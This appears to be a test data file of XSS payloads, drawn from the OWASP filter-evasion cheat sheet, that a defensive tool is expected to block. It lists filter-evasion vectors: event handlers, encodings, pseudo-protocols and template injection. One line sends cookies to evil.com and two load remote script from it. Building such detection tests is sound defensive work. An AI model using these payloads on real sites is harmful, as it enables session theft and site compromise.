# XSS 攻击样本
# 来源: OWASP XSS Filter Evasion Cheat Sheet + 公开 payload 数据集
# 期望: 所有样本均应被防御工具拦截（拦截率 >= 98%）

# ---- 基础脚本标签 ----
<script>alert('xss')</script>
<script>alert(document.cookie)</script>
<script>document.location='http://evil.com?c='+document.cookie</script>
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >
<scr<script>ipt>alert(1)</scr<script>ipt>

# ---- 事件处理器 ----
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<body onload=alert('xss')>
<a href="javascript:alert(1)">click me</a>
<a href=javascript:alert(1)>click</a>
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<button onclick=alert(1)>click</button>
<svg onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>

# ---- 伪协议 ----
javascript:alert(1)
javascript:alert(document.cookie)
java\u0000script:alert(1)
java\tscript:alert(1)
java\nscript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
mocha:[code]
livescript:[code]

# ---- 编码绕过 ----
%3Cscript%3Ealert(1)%3C%2Fscript%3E
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/&#115;&#99;&#114;&#105;&#112;&#116;&#62;
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
\x3cscript\x3ealert(1)\x3c/script\x3e
\u003cscript\u003ealert(1)\u003c/script\u003e

# ---- HTML5 向量 ----
<svg><script>alert&#40;1&#41;</script></svg>
<math><mtext></mtext><script>alert(1)</script></math>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<form><button formaction="javascript:alert(1)">X</button></form>
<isindex type=image src=1 onerror=alert(1)>

# ---- 基于 DOM 的 XSS ----
#' onclick=alert(1)//
#' onmouseover=alert(1)//
<img src="x" onerror="alert(1)">
<img src=`x` onerror="alert(1)">
<img src="jav&#x09;ascript:alert(1)">

# ---- 过滤绕过技巧 ----
<scr%00ipt>alert(1)</scr%00ipt>
<script/src="http://evil.com/xss.js"></script>
<script src=//evil.com/xss.js></script>
<<script>alert(1);//<</script>
<img src="x" onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

# ---- Angular / Vue / React 模板注入 ----
{{constructor.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
${alert(1)}
#{alert(1)}
<%= alert(1) %>

# ---- 基于样式 ----
<style>@import 'javascript:alert(1)';</style>
<style>body{background-image: url("javascript:alert(1)")}</style>

# ---- 使用 Unicode 和特殊字符 ----
<ſcript>alert(1)</ſcript>
<scrİpt>alert(1)</scrİpt>
<scriscriptpt>alert(1)</scriscriptpt>
<scri%00pt>alert(1)</scri%00pt>

# ---- 利用解析差异 ----
<title><img src=x onerror=alert(1)></title>
<noscript><img src=x onerror=alert(1)></noscript>
<plaintext><script>alert(1)</script>
<xmp><script>alert(1)</script></xmp>
